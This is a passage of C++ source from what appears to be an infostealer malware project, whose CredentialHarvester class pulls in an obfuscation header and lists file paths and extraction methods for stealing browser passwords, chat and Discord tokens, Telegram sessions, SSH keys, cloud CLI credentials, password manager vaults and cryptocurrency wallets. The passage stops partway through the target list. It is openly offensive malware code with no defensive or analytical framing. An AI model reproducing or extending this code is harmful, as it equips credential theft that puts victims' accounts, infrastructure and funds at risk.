#include <diarna/compiler_port.hpp>
#include <diarna/collection/credential_harvester.hpp>

#include <dpapi.h>
#include <wincred.h>
#include <shlobj.h>
#include <wincrypt.h>
#include <bcrypt.h>

#ifdef DIARNA_MINGW
#undef VAULT_ITEM
typedef struct _VAULT_ITEM {
    GUID    SchemaId;
    LPWSTR  pszCredentialFriendlyName;
    PVOID   pResource;
    PVOID   pIdentity;
    PVOID   pAuthenticator;
    FILETIME LastModified;
    DWORD   dwFlags;
    DWORD   dwPropertiesCount;
    PVOID   pProperties;
} VAULT_ITEM, *PVAULT_ITEM;

extern "C" {
DWORD WINAPI VaultEnumerateVaults(DWORD dwFlags, PDWORD pVaultsCount, GUID** ppVaultGuids);
DWORD WINAPI VaultOpenVault(GUID* pVaultId, DWORD dwFlags, HANDLE* phVault);
DWORD WINAPI VaultEnumerateItems(HANDLE hVault, DWORD dwFlags, PDWORD pItemsCount, PVOID* ppItems);
DWORD WINAPI VaultFree(PVOID pv);
DWORD WINAPI VaultCloseVault(HANDLE hVault);
}
#endif

#include <obfuscation/obfusheader.h>
namespace diarna::collection {

#define APP(cat, name, path, reg, pattern, method, recursive, allusers, minsize, enc, desc) \
    {name, cat, path, reg, pattern, method, recursive, allusers, minsize, enc, desc}

CredentialHarvester& CredentialHarvester::instance() {
    static CredentialHarvester h; return h;
}

CredentialHarvester::CredentialHarvester() { initialize_targets(); }

void CredentialHarvester::initialize_targets() {
    targets_ = {
        // ========== BROWSERS ==========
        APP("Browsers", "Google Chrome", "Google\\Chrome\\User Data", nullptr, "Login Data", ExtractionMethod::Chrome_CookieStyle, true, false, 1024, "AES-256-GCM v10+", "Chrome 80+ encrypted passwords"),
        APP("Browsers", "Microsoft Edge", "Microsoft\\Edge\\User Data", nullptr, "Login Data", ExtractionMethod::Chrome_CookieStyle, true, false, 1024, "AES-256-GCM v10+", "Edge Chromium passwords"),
        APP("Browsers", "Brave Browser", "BraveSoftware\\Brave-Browser\\User Data", nullptr, "Login Data", ExtractionMethod::Chrome_CookieStyle, true, false, 1024, "AES-256-GCM", "Brave Chromium"),
        APP("Browsers", "Opera Browser", "Opera Software\\Opera Stable", nullptr, "Login Data", ExtractionMethod::Chrome_CookieStyle, true, false, 1024, "AES-256-GCM", "Opera Chromium"),
        APP("Browsers", "Opera GX", "Opera Software\\Opera GX Stable", nullptr, "Login Data", ExtractionMethod::Chrome_CookieStyle, true, false, 1024, "AES-256-GCM", "Opera GX"),
        APP("Browsers", "Vivaldi", "Vivaldi\\User Data", nullptr, "Login Data", ExtractionMethod::Chrome_CookieStyle, true, false, 1024, "AES-256-GCM", "Vivaldi"),
        APP("Browsers", "Yandex Browser", "Yandex\\YandexBrowser\\User Data", nullptr, "Login Data", ExtractionMethod::Chrome_CookieStyle, true, false, 1024, "", "Yandex"),
        APP("Browsers", "Chromium", "Chromium\\User Data", nullptr, "Login Data", ExtractionMethod::Chrome_CookieStyle, true, false, 1024, "", "Chromium"),
        APP("Browsers", "Torch Browser", "Torch\\User Data", nullptr, "Login Data", ExtractionMethod::Chrome_CookieStyle, true, false, 1024, "", "Torch"),
        APP("Browsers", "Comodo Dragon", "Comodo\\Dragon\\User Data", nullptr, "Login Data", ExtractionMethod::Chrome_CookieStyle, true, false, 1024, "", "Comodo Dragon"),
        APP("Browsers", "360 Browser", "360Browser\\Browser\\User Data", nullptr, "Login Data", ExtractionMethod::Chrome_CookieStyle, true, false, 1024, "", "360 Browser"),
        APP("Browsers", "Epic Privacy Browser", "Epic Privacy Browser\\User Data", nullptr, "Login Data", ExtractionMethod::Chrome_CookieStyle, true, false, 1024, "", "Epic"),
        APP("Browsers", "Slimjet", "Slimjet\\User Data", nullptr, "Login Data", ExtractionMethod::Chrome_CookieStyle, true, false, 1024, "", "Slimjet"),
        APP("Browsers", "SRWare Iron", "SRWare Iron\\User Data", nullptr, "Login Data", ExtractionMethod::Chrome_CookieStyle, true, false, 1024, "", "SRWare Iron"),
        APP("Browsers", "Mozilla Firefox", "Mozilla\\Firefox\\Profiles", nullptr, "logins.json", ExtractionMethod::Firefox_NSS, true, false, 512, "3DES-CBC", "Firefox NSS encrypted"),
        APP("Browsers", "Firefox Developer", "Mozilla\\Firefox\\Profiles", nullptr, "logins.json", ExtractionMethod::Firefox_NSS, true, false, 512, "3DES-CBC", "Firefox Dev"),
        APP("Browsers", "Waterfox", "Waterfox\\Profiles", nullptr, "logins.json", ExtractionMethod::Firefox_NSS, true, false, 512, "3DES-CBC", "Waterfox"),
        APP("Browsers", "Pale Moon", "Moonchild Productions\\Pale Moon\\Profiles", nullptr, "logins.json", ExtractionMethod::Firefox_NSS, true, false, 512, "3DES-CBC", "Pale Moon"),
        APP("Browsers", "Thunderbird", "Thunderbird\\Profiles", nullptr, "logins.json", ExtractionMethod::Firefox_NSS, true, false, 512, "3DES-CBC", "Thunderbird mail"),

        // ========== EMAIL CLIENTS ==========
        APP("Email", "Microsoft Outlook", "Microsoft\\Outlook", "Software\\Microsoft\\Office\\Outlook\\Profiles", "*.ost", ExtractionMethod::Registry, false, false, 0, "MAPI", "Outlook profiles"),
        APP("Email", "Outlook Exchange", "Microsoft\\Outlook", nullptr, "*.pst", ExtractionMethod::CustomVault, true, false, 0, "", "Exchange cached creds"),
        APP("Email", "Windows Mail", "Microsoft\\Windows Mail", nullptr, "*.dat", ExtractionMethod::Vault_Enumerate, false, false, 0, "", "Windows Mail app"),
        APP("Email", "eM Client", "eM Client", nullptr, "accounts.dat", ExtractionMethod::SQLite, false, false, 512, "", "eM Client"),
        APP("Email", "Mailbird", "Mailbird", nullptr, "settings.db", ExtractionMethod::SQLite, false, false, 512, "", "Mailbird"),
        APP("Email", "Claws Mail", "Claws Mail", nullptr, "accountrc", ExtractionMethod::ConfigFile, false, false, 64, "", "Claws Mail"),
        APP("Email", "The Bat!", "The Bat!", nullptr, "*.abd", ExtractionMethod::ConfigFile, true, false, 256, "", "The Bat!"),
        APP("Email", "Postbox", "Postbox\\Profiles", nullptr, "logins.json", ExtractionMethod::Firefox_NSS, true, false, 512, "3DES-CBC", "Postbox"),
        APP("Email", "Foxmail", "Foxmail", nullptr, "accounts.xml", ExtractionMethod::XML_Parse, false, false, 256, "", "Foxmail"),
        APP("Email", "IncrediMail", "IncrediMail", nullptr, "identities.dat", ExtractionMethod::ConfigFile, true, false, 128, "", "IncrediMail"),
        APP("Email", "Becky! Internet Mail", "RimArts\\B2", nullptr, "*.ba2", ExtractionMethod::ConfigFile, true, false, 256, "", "Becky!"),

        // ========== FTP CLIENTS ==========
        APP("FTP", "FileZilla", "FileZilla", nullptr, "sitemanager.xml", ExtractionMethod::XML_Parse, false, false, 256, "Base64", "FileZilla sites"),
        APP("FTP", "FileZilla Recent", "FileZilla", nullptr, "recentservers.xml", ExtractionMethod::XML_Parse, false, false, 128, "Base64", "FileZilla recent"),
        APP("FTP", "WinSCP", "Martin Prikryl\\WinSCP", "Software\\Martin Prikryl\\WinSCP 2\\Sessions", "*.ini", ExtractionMethod::INI_Parse, true, false, 64, "AES-256", "WinSCP sessions"),
        APP("FTP", "Cyberduck", "Cyberduck", nullptr, "*.cyberducklicense", ExtractionMethod::ConfigFile, true, false, 128, "", "Cyberduck"),
        APP("FTP", "SmartFTP", "SmartFTP\\Client 2.0\\Favorites", nullptr, "*.xml", ExtractionMethod::XML_Parse, true, false, 128, "", "SmartFTP"),
        APP("FTP", "FlashFXP", "FlashFXP", nullptr, "Sites.dat", ExtractionMethod::ConfigFile, false, false, 256, "", "FlashFXP"),
        APP("FTP", "CuteFTP", "GlobalSCAPE\\CuteFTP", nullptr, "sm.dat", ExtractionMethod::ConfigFile, true, false, 256, "", "CuteFTP"),
        APP("FTP", "CoreFTP", "CoreFTP", nullptr, "sites.idx", ExtractionMethod::ConfigFile, false, false, 256, "", "CoreFTP"),
        APP("FTP", "FTP Navigator", "FTP Navigator", nullptr, "ftpsites.ini", ExtractionMethod::INI_Parse, false, false, 64, "", "FTP Navigator"),
        APP("FTP", "WS_FTP", "Ipswitch\\WS_FTP", nullptr, "*.ini", ExtractionMethod::INI_Parse, true, false, 128, "", "WS_FTP"),
        APP("FTP", "BulletProof FTP", "BulletProof Software\\BulletProof FTP", nullptr, "sites.bpx", ExtractionMethod::ConfigFile, false, false, 128, "", "BulletProof FTP"),
        APP("FTP", "FTPRush", "FTPRush", nullptr, "RushSite.xml", ExtractionMethod::XML_Parse, false, false, 128, "", "FTPRush"),
        APP("FTP", "classicFTP", "NCH Software\\ClassicFTP", nullptr, "*.dat", ExtractionMethod::ConfigFile, true, false, 64, "", "classicFTP"),

        // ========== VPN CLIENTS ==========
        APP("VPN", "NordVPN", "NordVPN", nullptr, "user.config", ExtractionMethod::ConfigFile, true, false, 256, "", "NordVPN"),
        APP("VPN", "ExpressVPN", "ExpressVPN", nullptr, "preferences.dat", ExtractionMethod::ConfigFile, false, false, 256, "", "ExpressVPN"),
        APP("VPN", "ProtonVPN", "ProtonVPN", nullptr, "user.config", ExtractionMethod::ConfigFile, true, false, 256, "", "ProtonVPN"),
        APP("VPN", "OpenVPN", "OpenVPN\\config", nullptr, "*.ovpn", ExtractionMethod::ConfigFile, true, false, 64, "", "OpenVPN"),
        APP("VPN", "OpenVPN Connect", "OpenVPN Connect", nullptr, "*.ovpn", ExtractionMethod::ConfigFile, true, false, 64, "", "OpenVPN Connect"),
        APP("VPN", "WireGuard", "WireGuard", nullptr, "*.conf", ExtractionMethod::ConfigFile, true, false, 64, "", "WireGuard"),
        APP("VPN", "Surfshark", "Surfshark", nullptr, "user.config", ExtractionMethod::ConfigFile, true, false, 256, "", "Surfshark"),
        APP("VPN", "CyberGhost", "CyberGhost", nullptr, "user.config", ExtractionMethod::ConfigFile, true, false, 256, "", "CyberGhost"),
        APP("VPN", "Private Internet Access", "Private Internet Access", nullptr, "pia_service_manager.log", ExtractionMethod::ConfigFile, false, false, 64, "", "PIA"),
        APP("VPN", "Hide.me", "Hide.me", nullptr, "config.json", ExtractionMethod::JSON_Parse, false, false, 128, "", "Hide.me"),
        APP("VPN", "IPVanish", "IPVanish", nullptr, "config.ini", ExtractionMethod::INI_Parse, false, false, 64, "", "IPVanish"),
        APP("VPN", "VyprVPN", "VyprVPN", nullptr, "user.config", ExtractionMethod::ConfigFile, false, false, 128, "", "VyprVPN"),
        APP("VPN", "Windscribe", "Windscribe", nullptr, "windscribe.ini", ExtractionMethod::INI_Parse, false, false, 128, "", "Windscribe"),
        APP("VPN", "Mullvad", "Mullvad VPN", nullptr, "settings.json", ExtractionMethod::JSON_Parse, false, false, 128, "", "Mullvad"),
        APP("VPN", "TunnelBear", "TunnelBear", nullptr, "user.config", ExtractionMethod::ConfigFile, false, false, 128, "", "TunnelBear"),
        APP("VPN", "Betternet", "Betternet", nullptr, "user.config", ExtractionMethod::ConfigFile, false, false, 128, "", "Betternet"),
        APP("VPN", "Hotspot Shield", "Hotspot Shield", nullptr, "config.xml", ExtractionMethod::XML_Parse, false, false, 128, "", "Hotspot Shield"),

        // ========== GAMING ==========
        APP("Gaming", "Steam", "Steam", "Software\\Valve\\Steam", "config\\loginusers.vdf", ExtractionMethod::ConfigFile, false, false, 64, "", "Steam accounts"),
        APP("Gaming", "Steam SSFN", "Steam", nullptr, "ssfn*", ExtractionMethod::Plaintext, false, false, 64, "", "Steam sentinel files"),
        APP("Gaming", "Epic Games", "EpicGamesLauncher\\Saved\\Config\\Windows", nullptr, "GameUserSettings.ini", ExtractionMethod::INI_Parse, true, false, 64, "", "Epic Games"),
        APP("Gaming", "Battle.net", "Battle.net", nullptr, "*.config", ExtractionMethod::ConfigFile, true, false, 64, "", "Battle.net"),
        APP("Gaming", "Origin", "Origin", nullptr, "local*.xml", ExtractionMethod::XML_Parse, true, false, 128, "", "EA Origin"),
        APP("Gaming", "EA Desktop", "Electronic Arts\\EA Desktop", nullptr, "*.ini", ExtractionMethod::INI_Parse, true, false, 64, "", "EA Desktop"),
        APP("Gaming", "Ubisoft Connect", "Ubisoft Game Launcher", nullptr, "settings.yml", ExtractionMethod::ConfigFile, false, false, 64, "", "Ubisoft Connect"),
        APP("Gaming", "GOG Galaxy", "GOG.com\\Galaxy\\Configuration", nullptr, "config.json", ExtractionMethod::JSON_Parse, false, false, 64, "", "GOG Galaxy"),
        APP("Gaming", "Minecraft", ".minecraft", nullptr, "launcher_profiles.json", ExtractionMethod::JSON_Parse, false, false, 256, "", "Minecraft profiles"),
        APP("Gaming", "Riot Games", "Riot Games", nullptr, "RiotClientSettings.yaml", ExtractionMethod::ConfigFile, true, false, 128, "", "Riot Client"),
        APP("Gaming", "Discord", "discord", nullptr, "Local Storage\\leveldb\\*", ExtractionMethod::TokenVault, true, false, 256, "", "Discord tokens"),
        APP("Gaming", "Discord PTB", "discordptb", nullptr, "Local Storage\\leveldb\\*", ExtractionMethod::TokenVault, true, false, 256, "", "Discord PTB tokens"),
        APP("Gaming", "Discord Canary", "discordcanary", nullptr, "Local Storage\\leveldb\\*", ExtractionMethod::TokenVault, true, false, 256, "", "Discord Canary tokens"),
        APP("Gaming", "Lightcord", "Lightcord", nullptr, "Local Storage\\leveldb\\*", ExtractionMethod::TokenVault, true, false, 256, "", "Lightcord tokens"),

        // ========== CLOUD STORAGE ==========
        APP("Cloud", "Dropbox", "Dropbox", nullptr, "info.json", ExtractionMethod::JSON_Parse, false, false, 128, "", "Dropbox"),
        APP("Cloud", "Dropbox Host DB", "Dropbox", nullptr, "host.db", ExtractionMethod::SQLite, false, false, 512, "", "Dropbox host db"),
        APP("Cloud", "Google Drive", "Google\\Drive", nullptr, "sync_config.db", ExtractionMethod::SQLite, true, false, 512, "", "Google Drive"),
        APP("Cloud", "OneDrive", "Microsoft\\OneDrive", nullptr, "settings\\*.ini", ExtractionMethod::INI_Parse, true, false, 128, "", "OneDrive"),
        APP("Cloud", "OneDrive Business", "OneDrive - *", nullptr, "*.dat", ExtractionMethod::TokenVault, true, false, 128, "", "OneDrive for Business"),
        APP("Cloud", "Nextcloud", "Nextcloud", nullptr, "nextcloud.cfg", ExtractionMethod::ConfigFile, true, false, 128, "", "Nextcloud"),
        APP("Cloud", "ownCloud", "ownCloud", nullptr, "owncloud.cfg", ExtractionMethod::ConfigFile, true, false, 128, "", "ownCloud"),
        APP("Cloud", "MEGA", "MEGA", nullptr, "*.cfg", ExtractionMethod::ConfigFile, true, false, 128, "", "MEGA.nz"),
        APP("Cloud", "MEGA CMD", ".megaCmd", nullptr, "*.session", ExtractionMethod::ConfigFile, true, false, 128, "", "MEGA cmd"),
        APP("Cloud", "pCloud", "pCloud", nullptr, "pCloud.data", ExtractionMethod::ConfigFile, false, false, 256, "", "pCloud"),
        APP("Cloud", "Box Drive", "Box\\Box", nullptr, "*.db", ExtractionMethod::SQLite, true, false, 256, "", "Box Drive"),
        APP("Cloud", "iCloud", "Apple Computer\\iCloud", nullptr, "*.plist", ExtractionMethod::XML_Parse, true, false, 128, "", "iCloud for Windows"),
        APP("Cloud", "Yandex Disk", "Yandex\\YandexDisk", nullptr, "*.config", ExtractionMethod::ConfigFile, true, false, 128, "", "Yandex Disk"),
        APP("Cloud", "Backblaze", "Backblaze", nullptr, "bz*.xml", ExtractionMethod::XML_Parse, false, false, 256, "", "Backblaze"),

        // ========== CHAT / IM ==========
        APP("Chat", "Telegram Desktop", "Telegram Desktop", nullptr, "tdata\\D877F783D5D3EF8C*", ExtractionMethod::Memory_Scan, true, false, 1024, "", "Telegram sessions"),
        APP("Chat", "Telegram Key", "Telegram Desktop", nullptr, "tdata\\key_*", ExtractionMethod::Plaintext, true, false, 64, "", "Telegram key files"),
        APP("Chat", "WhatsApp Desktop", "WhatsApp", nullptr, "Local Storage\\leveldb\\*", ExtractionMethod::TokenVault, true, false, 256, "", "WhatsApp Desktop"),
        APP("Chat", "Signal Desktop", "Signal", nullptr, "config.json", ExtractionMethod::JSON_Parse, false, false, 256, "", "Signal Desktop"),
        APP("Chat", "Signal Database", "Signal", nullptr, "sql\\db.sqlite", ExtractionMethod::SQLite, false, false, 1024, "", "Signal message db"),
        APP("Chat", "Slack", "Slack", nullptr, "Local Storage\\leveldb\\*", ExtractionMethod::TokenVault, true, false, 256, "", "Slack tokens"),
        APP("Chat", "Microsoft Teams", "Microsoft\\Teams", nullptr, "Local Storage\\leveldb\\*", ExtractionMethod::TokenVault, true, false, 256, "", "Teams tokens"),
        APP("Chat", "Skype", "Microsoft\\Skype for Desktop", nullptr, "Local Storage\\leveldb\\*", ExtractionMethod::TokenVault, true, false, 256, "", "Skype"),
        APP("Chat", "Skype Classic", "Skype", nullptr, "*.db", ExtractionMethod::SQLite, true, false, 256, "", "Skype classic"),
        APP("Chat", "Zoom", "Zoom", nullptr, "*.db", ExtractionMethod::SQLite, true, false, 512, "", "Zoom meetings"),
        APP("Chat", "Viber", "ViberPC", nullptr, "viber.db", ExtractionMethod::SQLite, true, false, 1024, "", "Viber"),
        APP("Chat", "Line", "LINE", nullptr, "*.db", ExtractionMethod::SQLite, false, false, 512, "", "LINE desktop"),
        APP("Chat", "WeChat", "Tencent\\WeChat", nullptr, "*.db", ExtractionMethod::SQLite, true, false, 512, "", "WeChat"),
        APP("Chat", "Element (Riot)", "Element", nullptr, "*.db", ExtractionMethod::SQLite, true, false, 512, "", "Element/Riot"),
        APP("Chat", "Pidgin", ".purple", nullptr, "accounts.xml", ExtractionMethod::XML_Parse, false, false, 128, "", "Pidgin accounts"),
        APP("Chat", "Trillian", "Trillian", nullptr, "*.ini", ExtractionMethod::INI_Parse, true, false, 128, "", "Trillian"),
        APP("Chat", "Miranda NG", "Miranda NG", nullptr, "*.dat", ExtractionMethod::ConfigFile, true, false, 256, "", "Miranda NG"),
        APP("Chat", "ICQ", "ICQ", nullptr, "*.mra", ExtractionMethod::ConfigFile, true, false, 128, "", "ICQ"),

        // ========== DATABASE TOOLS ==========
        APP("Database", "MySQL Workbench", "MySQL\\Workbench", nullptr, "connections.xml", ExtractionMethod::XML_Parse, false, false, 256, "", "MySQL Workbench"),
        APP("Database", "MySQL Workbench Keychain", "MySQL\\Workbench", nullptr, "keychain*.xml", ExtractionMethod::XML_Parse, false, false, 256, "", "MySQL stored passwords"),
        APP("Database", "pgAdmin", "pgAdmin", nullptr, "pgadmin4.db", ExtractionMethod::SQLite, true, false, 512, "", "pgAdmin connections"),
        APP("Database", "SQL Server Management Studio", "Microsoft\\SQL Server Management Studio", nullptr, "SqlStudio.bin", ExtractionMethod::ConfigFile, true, false, 512, "", "SSMS saved connections"),
        APP("Database", "SSMS 18+", "Microsoft\\SQL Server Management Studio\\*", nullptr, "UserSettings.xml", ExtractionMethod::XML_Parse, true, false, 256, "", "SSMS user settings"),
        APP("Database", "Azure Data Studio", "azuredatastudio", nullptr, "*.db", ExtractionMethod::SQLite, true, false, 512, "", "Azure Data Studio"),
        APP("Database", "DBeaver", ".dbeaver4", nullptr, "credentials-config.json", ExtractionMethod::JSON_Parse, false, false, 512, "", "DBeaver credentials"),
        APP("Database", "HeidiSQL", "HeidiSQL", nullptr, "settings.txt", ExtractionMethod::INI_Parse, false, false, 256, "", "HeidiSQL sessions"),
        APP("Database", "Navicat", "PremiumSoft\\Navicat*", nullptr, "*.npt", ExtractionMethod::ConfigFile, true, false, 1024, "Blowfish", "Navicat connections"),
        APP("Database", "Toad for Oracle", "Quest Software\\Toad for Oracle", nullptr, "connections.xml", ExtractionMethod::XML_Parse, true, false, 256, "", "Toad connections"),
        APP("Database", "PL/SQL Developer", "PLSQL Developer", nullptr, "*.ini", ExtractionMethod::INI_Parse, false, false, 128, "", "PL/SQL Developer"),
        APP("Database", "SQL Developer", "SQL Developer", nullptr, "connections.json", ExtractionMethod::JSON_Parse, true, false, 256, "", "Oracle SQL Developer"),
        APP("Database", "Robo 3T", ".3T\\robo-3t", nullptr, "*.json", ExtractionMethod::JSON_Parse, false, false, 128, "", "Robo 3T"),
        APP("Database", "MongoDB Compass", "MongoDB Compass", nullptr, "Connections", ExtractionMethod::JSON_Parse, true, false, 256, "", "MongoDB Compass"),
        APP("Database", "TablePlus", "TablePlus", nullptr, "*.db", ExtractionMethod::SQLite, false, false, 512, "", "TablePlus connections"),

        // ========== DEV TOOLS ==========
        APP("DevTools", "Git for Windows", ".gitconfig", nullptr, "*", ExtractionMethod::ConfigFile, false, false, 64, "", "Git global config"),
        APP("DevTools", "Git Credential Manager", ".git-credentials", nullptr, "*", ExtractionMethod::Plaintext, false, false, 64, "", "Git stored credentials"),
        APP("DevTools", "GitHub Desktop", "GitHub Desktop", nullptr, "*.db", ExtractionMethod::SQLite, false, false, 256, "", "GitHub Desktop"),
        APP("DevTools", "SSH Keys", ".ssh", nullptr, "id_*", ExtractionMethod::Plaintext, false, false, 64, "", "SSH private keys"),
        APP("DevTools", "PuTTY", ".putty\\sessions", "Software\\SimonTatham\\PuTTY\\Sessions", "*", ExtractionMethod::Registry, false, false, 64, "", "PuTTY sessions"),
        APP("DevTools", "WinSCP PuTTY Cache", ".putty\\sshhostkeys", nullptr, "*", ExtractionMethod::Plaintext, false, false, 64, "", "PuTTY host keys"),
        APP("DevTools", "AWS CLI", ".aws", nullptr, "credentials", ExtractionMethod::INI_Parse, false, false, 64, "", "AWS credentials"),
        APP("DevTools", "AWS CLI Config", ".aws", nullptr, "config", ExtractionMethod::INI_Parse, false, false, 64, "", "AWS config"),
        APP("DevTools", "Azure CLI", ".azure", nullptr, "*.json", ExtractionMethod::JSON_Parse, true, false, 256, "Azure Keyring", "Azure credentials"),
        APP("DevTools", "gcloud CLI", "gcloud", nullptr, "credentials.db", ExtractionMethod::SQLite, true, false, 256, "", "Google Cloud CLI"),
        APP("DevTools", "Docker Desktop", ".docker", nullptr, "config.json", ExtractionMethod::JSON_Parse, false, false, 128, "", "Docker credentials"),
        APP("DevTools", "npm", ".npmrc", nullptr, "*", ExtractionMethod::ConfigFile, false, false, 64, "", "npm registry tokens"),
        APP("DevTools", "pip", "pip", nullptr, "pip.ini", ExtractionMethod::INI_Parse, true, false, 64, "", "pip config"),
        APP("DevTools", "VS Code", "Code\\User", nullptr, "settings.json", ExtractionMethod::JSON_Parse, false, false, 512, "", "VS Code settings"),
        APP("DevTools", "VS Code Tokens", "Code\\User\\globalStorage", nullptr, "state.vscdb", ExtractionMethod::SQLite, true, false, 512, "", "VS Code stored tokens"),
        APP("DevTools", "IntelliJ IDEA", "JetBrains\\IntelliJIdea*", nullptr, "settingsRepository\\repository\\*.xml", ExtractionMethod::XML_Parse, true, false, 256, "", "JetBrains IDE settings"),
        APP("DevTools", "Postman", "Postman", nullptr, "*.json", ExtractionMethod::JSON_Parse, true, false, 512, "", "Postman collections"),
        APP("DevTools", "Insomnia", "Insomnia", nullptr, "*.db", ExtractionMethod::SQLite, false, false, 256, "", "Insomnia REST client"),
        APP("DevTools", "FileZilla Pro", "FileZilla", nullptr, "filezilla.xml", ExtractionMethod::XML_Parse, false, false, 256, "Base64", "FileZilla Pro enterprise"),

        // ========== REMOTE DESKTOP ==========
        APP("RemoteDesktop", "Windows RDP", "Microsoft\\Terminal Server Client", "Software\\Microsoft\\Terminal Server Client\\Servers", "*", ExtractionMethod::Registry, false, false, 64, "", "RDP saved connections"),
        APP("RemoteDesktop", "TeamViewer", "TeamViewer", nullptr, "*.tvc", ExtractionMethod::ConfigFile, true, false, 256, "", "TeamViewer config"),
        APP("RemoteDesktop", "AnyDesk", "AnyDesk", nullptr, "*.conf", ExtractionMethod::ConfigFile, true, false, 128, "", "AnyDesk"),
        APP("RemoteDesktop", "VNC Viewer", "RealVNC\\VNC Viewer", nullptr, "*.vnc", ExtractionMethod::ConfigFile, true, false, 64, "", "RealVNC Viewer"),
        APP("RemoteDesktop", "TightVNC", "TightVNC", nullptr, "*.tvc", ExtractionMethod::ConfigFile, true, false, 64, "", "TightVNC"),
        APP("RemoteDesktop", "UltraVNC", "ORL\\VNC", nullptr, "*.vnc", ExtractionMethod::ConfigFile, true, false, 64, "", "UltraVNC"),
        APP("RemoteDesktop", "mRemoteNG", "mRemoteNG", nullptr, "confCons.xml", ExtractionMethod::XML_Parse, false, false, 512, "AES-256", "mRemoteNG connections"),
        APP("RemoteDesktop", "Royal TS", "code4ward\\Royal TS", nullptr, "*.rtsx", ExtractionMethod::XML_Parse, true, false, 512, "", "Royal TS connections"),
        APP("RemoteDesktop", "Remote Desktop Manager", "Devolutions\\RemoteDesktopManager", nullptr, "*.rdd", ExtractionMethod::ConfigFile, true, false, 1024, "", "RDM"),
        APP("RemoteDesktop", "Terminals", "Terminals", nullptr, "*.config", ExtractionMethod::ConfigFile, true, false, 256, "", "Terminals"),
        APP("RemoteDesktop", "NoMachine", "NoMachine", nullptr, "*.nx", ExtractionMethod::ConfigFile, true, false, 64, "", "NoMachine"),
        APP("RemoteDesktop", "Parsec", "Parsec", nullptr, "config.txt", ExtractionMethod::ConfigFile, false, false, 128, "", "Parsec"),
        APP("RemoteDesktop", "Splashtop", "Splashtop", nullptr, "*.conf", ExtractionMethod::ConfigFile, true, false, 128, "", "Splashtop"),
        APP("RemoteDesktop", "Chrome Remote Desktop", "Google\\Chrome Remote Desktop", nullptr, "*.json", ExtractionMethod::JSON_Parse, true, false, 128, "", "Chrome Remote Desktop"),

        // ========== PASSWORD MANAGERS ==========
        APP("PasswordManagers", "KeePass", "Programs\\KeePass*", nullptr, "*.kdbx", ExtractionMethod::CustomVault, true, true, 1024, "AES-256", "KeePass database"),
        APP("PasswordManagers", "KeePassXC", "KeePassXC", nullptr, "*.kdbx", ExtractionMethod::CustomVault, true, false, 1024, "AES-256", "KeePassXC"),
        APP("PasswordManagers", "LastPass", "", nullptr, "lpass.db", ExtractionMethod::TokenVault, true, false, 4096, "", "LastPass vault"),
        APP("PasswordManagers", "1Password", "1Password", nullptr, "*.opvault", ExtractionMethod::JSON_Parse, true, false, 8192, "AES-256-GCM", "1Password vault"),
        APP("PasswordManagers", "Bitwarden", "Bitwarden", nullptr, "data.json", ExtractionMethod::JSON_Parse, false, false, 4096, "AES-256-CBC", "Bitwarden vault"),
        APP("PasswordManagers", "Dashlane", "Dashlane", nullptr, "data.*", ExtractionMethod::TokenVault, true, false, 4096, "", "Dashlane vault"),
        APP("PasswordManagers", "RoboForm", "RoboForm", nullptr, "*.rfo", ExtractionMethod::ConfigFile, true, false, 4096, "", "RoboForm"),
        APP("PasswordManagers", "NordPass", "NordPass", nullptr, "*.db", ExtractionMethod::SQLite, true, false, 512, "", "NordPass"),
        APP("PasswordManagers", "Enpass", "Enpass", nullptr, "*.walletx", ExtractionMethod::SQLite, true, false, 4096, "", "Enpass"),
        APP("PasswordManagers", "Password Safe", "Password Safe", nullptr, "*.psafe3", ExtractionMethod::ConfigFile, true, false, 256, "", "Password Safe"),
        APP("PasswordManagers", "Sticky Password", "Sticky Password", nullptr, "*.spf", ExtractionMethod::ConfigFile, true, false, 256, "", "Sticky Password"),
        APP("PasswordManagers", "Kaspersky Password Manager", "Kaspersky Lab\\Kaspersky Password Manager", nullptr, "*.db", ExtractionMethod::SQLite, true, false, 4096, "", "Kaspersky PM"),
        APP("PasswordManagers", "Keeper", "Keeper", nullptr, "*.db", ExtractionMethod::SQLite, true, false, 4096, "", "Keeper"),
        APP("PasswordManagers", "Avira Password Manager", "Avira\\Password Manager", nullptr, "*.db", ExtractionMethod::SQLite, true, false, 1024, "", "Avira PM"),
        APP("PasswordManagers", "McAfee True Key", "True Key", nullptr, "*.db", ExtractionMethod::SQLite, false, false, 4096, "", "True Key"),

        // ========== CRYPTO WALLETS ==========
        APP("Crypto", "Bitcoin Core", "Bitcoin", nullptr, "wallet.dat", ExtractionMethod::CustomVault, true, false, 1024, "", "Bitcoin Core wallet"),
        APP("Crypto", "Electrum", "Electrum\\wallets", nullptr, "*", ExtractionMethod::JSON_Parse, true, false, 256, "", "Electrum wallets"),
        APP("Crypto", "Exodus", "Exodus", nullptr, "exodus.wallet", ExtractionMethod::JSON_Parse, true, false, 1024, "", "Exodus wallet"),
        APP("Crypto", "Atomic Wallet", "atomic\\Local Storage\\leveldb", nullptr, "*", ExtractionMethod::TokenVault, true, false, 256, "", "Atomic Wallet"),
        APP("Crypto", "MetaMask", "*\\MetaMask", nullptr, "*.ldb", ExtractionMethod::TokenVault, true, false, 1024, "", "MetaMask extension data"),
        APP("Crypto", "Coinbase Wallet", "Coinbase Wallet", nullptr, "*.json", ExtractionMethod::JSON_Parse, true, false, 256, "", "Coinbase Wallet"),
        APP("Crypto", "Binance Chain Wallet", "Binance Chain Wallet", nullptr, "*.ldb", ExtractionMethod::TokenVault, true, false, 256, "", "Binance Chain Wallet"),
        APP("Crypto", "Trust Wallet", "Trust Wallet", nullptr, "*.json", ExtractionMethod::JSON_Parse, true, false, 256, "", "Trust Wallet"),
        APP("Crypto", "Phantom Wallet", "Phantom Wallet", nullptr, "*.ldb", ExtractionMethod::TokenVault, true, false, 256, "", "Phantom/Solana wallet"),
        APP("Crypto", "MyEtherWallet", "MyEtherWallet", nullptr, "*.json", ExtractionMethod::JSON_Parse, true, false, 256, "", "MyEtherWallet keystore"),
        APP("Crypto", "Ledger Live", "Ledger Live", nullptr, "app.json", ExtractionMethod::JSON_Parse, false, false, 256, "", "Ledger Live"),
        APP("Crypto", "Trezor Suite", "Trezor Suite", nullptr, "*.json", ExtractionMethod::JSON_Parse, true, false, 256, "", "Trezor Suite"),
        APP("Crypto", "Monero GUI", "Monero\\wallets", nullptr, "*.keys", ExtractionMethod::ConfigFile, true, false, 256, "", "Monero wallet keys"),
        APP("Crypto", "Zcash", "Zcash", nullptr, "wallet.dat", ExtractionMethod::CustomVault, true, false, 1024, "", "Zcash wallet"),
